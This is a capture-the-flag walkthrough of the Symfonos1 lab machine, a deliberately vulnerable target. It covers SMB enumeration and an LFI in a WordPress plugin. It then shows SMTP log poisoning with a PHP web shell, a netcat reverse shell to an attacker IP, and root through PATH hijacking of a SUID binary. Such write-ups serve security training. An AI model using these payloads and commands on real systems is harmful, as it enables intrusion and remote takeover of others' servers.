**Symfonos1 Walkthrough**

<img width="720" height="291" alt="image" src="https://github.com/user-attachments/assets/446ecf6b-c544-4432-ad61-6953a046897f" />

<img width="720" height="161" alt="image" src="https://github.com/user-attachments/assets/5d747529-125d-4bd6-8ba7-6edaf5ad919f" />

<img width="720" height="454" alt="image" src="https://github.com/user-attachments/assets/07bf4aef-bed3-45e3-9f1b-3d4cdabb7c59" />

We can see that Samba is running on port 139. Lets start our enumeration with Samba

smbclient -L //<IP Address>

<img width="720" height="347" alt="image" src="https://github.com/user-attachments/assets/6dba4284-3bc8-4ab1-96c8-c7b49dc58063" />

Default user of Samba is Guest. If we dont put any username, it will take default username i.e Guest. Also if we dont put any password and just press enter, it will take default password i.e Samba.

We have helios and anonymous folders available.

Let try to get into each folder.

smbclient //<ipaddress/foldername>

<img width="718" height="151" alt="image" src="https://github.com/user-attachments/assets/6da645f0-42bc-4919-aa15-ee5bdb8d2670" />

ls >> to list all the files

<img width="720" height="224" alt="image" src="https://github.com/user-attachments/assets/ca462af8-3fe3-4eb4-abd6-c1b4d8a392f7" />

There is a file named attention.txt. Lets download it in our machine.

get <filename>

<img width="720" height="213" alt="image" src="https://github.com/user-attachments/assets/be206d06-4428-4ed9-9ca6-f2e7e9b53cb0" />

Lets check what do we have in attention.txt

<img width="720" height="287" alt="image" src="https://github.com/user-attachments/assets/9b03152c-611a-4c98-9142-b276d86c856f" />

Lets enumerate further with enum4linux

enum4linux <IP Address>

<img width="720" height="116" alt="image" src="https://github.com/user-attachments/assets/a66ab626-5f81-42c4-93a2-0880985982eb" />

<img width="720" height="277" alt="image" src="https://github.com/user-attachments/assets/ad62ddf7-6bcf-49c5-92ac-a70591b0788a" />

In SMB we have an another user called helios and his path is //<IP/helios

Lets try to access it.

<img width="675" height="393" alt="image" src="https://github.com/user-attachments/assets/498d2397-72d2-4479-9adc-b76602524fa5" />

‘qwerty’ works for user helios

<img width="720" height="234" alt="image" src="https://github.com/user-attachments/assets/b9079fca-8460-4859-9b3d-50010549a438" />

We have two txt files. Lets download it and check what they have.

<img width="720" height="174" alt="image" src="https://github.com/user-attachments/assets/0fc44727-90f5-45ae-ab3c-8dff2f7fd010" />

/h3l105 looks like a path. Lets test

<img width="720" height="304" alt="image" src="https://github.com/user-attachments/assets/3c32aba4-8961-4bc5-b149-d642071d5ffe" />

<img width="720" height="401" alt="image" src="https://github.com/user-attachments/assets/7af00eb6-23c7-43cc-9930-ff35b036cd7d" />

It seems like a wordpress cms.

/wp-admin give login for users. Lets try that.

<img width="720" height="365" alt="image" src="https://github.com/user-attachments/assets/064183d4-1f1c-49fe-9e5c-0878339f473e" />

Here we are getting some domain name error. Let add this domain in /etc/hosts file.

<img width="655" height="256" alt="image" src="https://github.com/user-attachments/assets/a66fcc96-30a3-4d0d-8ff5-ab6f40ff5501" />

Lets try again

<img width="720" height="382" alt="image" src="https://github.com/user-attachments/assets/8b567c47-4f7d-4e9f-ae84-26d882eeb510" />

Lets scan this CMS by wpscan

***wpscan -- url ‘http://symfonos.local/h3l105' -e u*** >> to enumurate usernames

wpscan --update >> to upate the database of wpscan

<img width="720" height="492" alt="image" src="https://github.com/user-attachments/assets/aade453b-53f3-4452-a9e1-f2bee0419498" />

<img width="720" height="196" alt="image" src="https://github.com/user-attachments/assets/7ac57add-6caa-4ef5-b9f7-df9707887e3a" />

We have only one user i.e admin.

Lets scan for plugins

wpscan --url ‘http://symfonos.local/h3l105' -e ap>> to enumurate all plugins

<img width="720" height="363" alt="image" src="https://github.com/user-attachments/assets/9abc0886-2a10-461d-88a5-3e6c5fa634a5" />

Two plugins were found mail-masta and site-editor

Lets search these plugs exploit.

https://www.exploit-db.com/exploits/40290?source=post_page-----7f60d7ca2f18---------------------------------------

https://www.exploit-db.com/exploits/44340?source=post_page-----7f60d7ca2f18---------------------------------------

Both plug-in have LFI exploit.

Lets try site editor.

<img width="720" height="43" alt="image" src="https://github.com/user-attachments/assets/37f45f4d-512b-4545-b0e9-8b95a0eba31a" />

http://<host>/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/etc/passwd

<img width="720" height="109" alt="image" src="https://github.com/user-attachments/assets/4f36f289-5d55-4a0f-9fbb-29ae73103e45" />

Now, if any application is vulnerable to LFI, we can get reverse shell by LFI by Apache server log poisoning or SMTP log poisoning.

We can see SMTP services are running on port 25.

First we need to find SMTP logs.

Lets Google

https://www.hackingarticles.in/smtp-log-poisioning-through-lfi-to-remote-code-exceution/

mail.log is the default location of SMTP. If we are able to access mail.log, it means mail.log has read and write permissions.

symfonos.local/h3l105/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/var/log/mail.log

<img width="720" height="146" alt="image" src="https://github.com/user-attachments/assets/d8b4a266-5796-4192-83b9-e81d73ae4797" />

We dont find any files here. May be the admin has changed the location of the emails. Emails will always be stored in /var folder. We need to figure it where in /var folder emails are stored.

Now we have a local user ‘helios’.

Lets guess where files can be.

/var/log/helios

<img width="720" height="141" alt="image" src="https://github.com/user-attachments/assets/1f835a29-e70a-40e7-aed4-8b29b4625991" />

We have nothing here

/var/log/mail/helios

<img width="720" height="133" alt="image" src="https://github.com/user-attachments/assets/ab3471a0-445b-4170-820c-391198c676e1" />

Nothing here as well.

/var/mail/helios

<img width="720" height="214" alt="image" src="https://github.com/user-attachments/assets/80444c74-c102-4e15-a6c0-da02a9ebbac9" />

We got some output here. So this could be the log files location.

Now we will poison the log file. We will add a php code in the log file and that code will exploit the log files.

Now we need to connect with SMTP port. In the blog they are using telnet. We can use netcat or telnet.

nc <IP address> <port>

<img width="519" height="112" alt="image" src="https://github.com/user-attachments/assets/a6fb54e8-8d55-45e6-8ec3-ab1c78110012" />

We are connected now

Now we need to find a user of SMTP server. Helios could be the SMTP user. In the logs we found helios@symfonos.local domain.

Lets verify

HELO helios

<img width="720" height="141" alt="image" src="https://github.com/user-attachments/assets/d5c2395e-dac9-47fa-a227-51a98cd780bc" />

We got ‘250 symfonos.localdomain’. It means helios is a SMTP user.

MAIL FROM: <email> >> command to send emal in SMTP server.

NOTE: This is a dummy machine hence we can use any random email to send emails.

<img width="606" height="136" alt="image" src="https://github.com/user-attachments/assets/0e0fde69-70f1-4934-8155-9f9478343883" />

Its working

RCPT TO: <receiver name> >> To whom the mail will delivered.

<img width="720" height="188" alt="image" src="https://github.com/user-attachments/assets/b8239d20-8339-4eca-951f-a565c691b10b" />

Now we need to send data.

data << for sending data

<img width="586" height="184" alt="image" src="https://github.com/user-attachments/assets/24587fd3-4feb-41c0-b0bb-5d24fab7281e" />

Its saying we can end our data by <CR><LF>.<CR><LF>

Means after our data we need to press ‘enter’. In new line we need to put a . and then again press the ‘enter’. <CR><LF> means ‘enter’

Now, we need to send some data which will contain our php code that will exploit the log files.

<?php system($_GET[‘c’]); ?>

<img width="720" height="239" alt="image" src="https://github.com/user-attachments/assets/4161fd13-a7ca-415d-af50-59e97ac16a66" />

Our data has been sent. Now we need to access the log file.

we will add ‘&c=whoami’ in our LFI

http://symfonos.local/h3l105/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/var/mail/helios&c=whoami

<img width="720" height="188" alt="image" src="https://github.com/user-attachments/assets/fa4b42ee-3484-41d6-a14e-7197b55853d7" />

Now lets check if we can execute any command or not

http://symfonos.local/h3l105/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/var/mail/helios&c=id

<img width="720" height="217" alt="image" src="https://github.com/user-attachments/assets/c9cab324-1e6c-416e-ae22-9c3f83941079" />

We are getting output of our commands. It means our commands are executing and now we can take reverse shell.

http://symfonos.local/h3l105/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/var/mail/helios&c=nc -e /bin/sh 192.168.56.101 1234

<img width="720" height="184" alt="image" src="https://github.com/user-attachments/assets/911b2945-cbbb-46f7-ab9d-23760d2178e1" />

And we got the shell

<img width="720" height="220" alt="image" src="https://github.com/user-attachments/assets/ea2a8bc6-3746-400b-9cb7-73149390b00b" />

<img width="720" height="169" alt="image" src="https://github.com/user-attachments/assets/7cb810fd-97aa-457e-9d2c-deeb4125d701" />

<img width="712" height="571" alt="image" src="https://github.com/user-attachments/assets/31984860-4334-4c1e-96fd-0b6eb560cedd" />

<img width="631" height="685" alt="image" src="https://github.com/user-attachments/assets/9ad6f729-2b3c-49bd-afcd-4e81facda795" />

<img width="720" height="550" alt="image" src="https://github.com/user-attachments/assets/91bd4e64-a629-42a2-ae94-21758186a602" />

Lets check wp-config.php file.

<img width="720" height="333" alt="image" src="https://github.com/user-attachments/assets/326fb27c-9212-475b-b6e6-904e93987ad7" />

We got username wordpress and password password123

mysql -h localhost -u wordpress -p

<img width="720" height="304" alt="image" src="https://github.com/user-attachments/assets/6d8a3812-a3aa-4176-9bef-26f1a41708d4" />

<img width="703" height="417" alt="image" src="https://github.com/user-attachments/assets/e4688dc8-0b54-4bb1-aa29-e2d509318e4f" />

<img width="720" height="451" alt="image" src="https://github.com/user-attachments/assets/1aba490b-736c-4d2a-ac4e-fcdb299c12c8" />

<img width="720" height="138" alt="image" src="https://github.com/user-attachments/assets/02580cef-b1c4-4354-9de3-8d89e2348daf" />

Lets check the binaries

find / -perm -u=s -type f 2>/dev/null

<img width="720" height="289" alt="image" src="https://github.com/user-attachments/assets/bd62b5c1-0ce3-449b-a363-cfa896910964" />

Lets check statuscheck

<img width="720" height="245" alt="image" src="https://github.com/user-attachments/assets/07c6ecd8-e012-4c40-a220-eedf50945f15" />

Its an execuitable file.

<img width="693" height="154" alt="image" src="https://github.com/user-attachments/assets/8f195626-3e90-4076-9839-e24529300941" />

This file has root level permissions.

strings <filename> >> will tell what this file is doing.

<img width="720" height="289" alt="image" src="https://github.com/user-attachments/assets/45648684-852a-4f43-90bd-62b65f103222" />

echo ‘/bin/bash’ > curl

We are creating a file with same name, curl and storing /bin/bash and giving full permission.

<img width="651" height="136" alt="image" src="https://github.com/user-attachments/assets/5cd3ec70-7603-4cca-9021-882aa05abfee" />

<img width="630" height="127" alt="image" src="https://github.com/user-attachments/assets/437a5085-5f2f-4558-a285-e8645bf19e43" />

Now we will set /tmp on the path veriable, so that when we perform curl command, system will start searching curl commnad from /tmp. And we have created a curl in /tmp folder. It will get executed and we will get a shell.

export PATH=/tmp:PATH

<img width="667" height="214" alt="image" src="https://github.com/user-attachments/assets/c7382462-4e90-4d36-b14b-56b8ce41155f" />

Lets execute the file

<img width="720" height="250" alt="image" src="https://github.com/user-attachments/assets/da72087b-7423-4fee-92ed-6458174d3985" />

We are still helios.

We have put ‘/bin/bash’ in the curl file. Lets add /bin/sh in curl and try again

<img width="720" height="343" alt="image" src="https://github.com/user-attachments/assets/9097faf4-50c3-4992-a6aa-53cb5a9adb52" />

Lets execute the file again

<img width="541" height="286" alt="image" src="https://github.com/user-attachments/assets/53b8b6b1-bb68-48d7-88eb-8fdd46032bb7" />

We are root user

<img width="688" height="142" alt="image" src="https://github.com/user-attachments/assets/d186ead6-0900-4e79-a762-fbae5e5dd9f5" />

<img width="720" height="525" alt="image" src="https://github.com/user-attachments/assets/85cb1ff0-76bd-470f-869e-559638dc715e" />

